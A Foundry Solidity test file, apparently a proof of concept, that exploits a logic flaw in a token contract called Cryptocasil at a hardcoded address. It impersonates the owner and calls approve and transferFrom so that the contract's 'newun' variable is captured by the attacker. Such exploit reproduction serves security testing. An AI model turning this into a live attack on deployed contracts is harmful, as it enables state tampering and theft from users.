// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Cryptocasil {
    function owner() external view returns (address);
    function newun() external view returns (address);
    function approve(address spender, uint tokens) external returns (bool);
    function transferFrom(address from, address to, uint tokens) external returns (bool);
    function balanceOf(address tokenOwner) external view returns (uint);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x63769c0499f94D4E31fAc0F01D5d226bdd2C927D;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address from the contract
        address owner = Cryptocasil(TARGET).owner();

        // Label for debugging
        vm.label(owner, "Contract Owner");

        // We'll need to impersonate the owner to approve tokens
        // No token injection needed since owner already has tokens
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the owner address
        address owner = Cryptocasil(TARGET).owner();

        // Step 2: Impersonate owner to approve our attacker address
        vm.startPrank(owner);
        Cryptocasil(TARGET).approve(attacker, 1 ether);
        vm.stopPrank();

        // Step 3: Call transferFrom with our address as recipient
        // This should trigger: if(from != address(0) && newun == address(0)) newun = to;
        Cryptocasil(TARGET).transferFrom(owner, attacker, 1);

        // Step 4: Verify newun is now our address
        address currentNewun = Cryptocasil(TARGET).newun();
        assertEq(currentNewun, attacker, "newun should be attacker address");
        assertEq(currentNewun, attacker, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
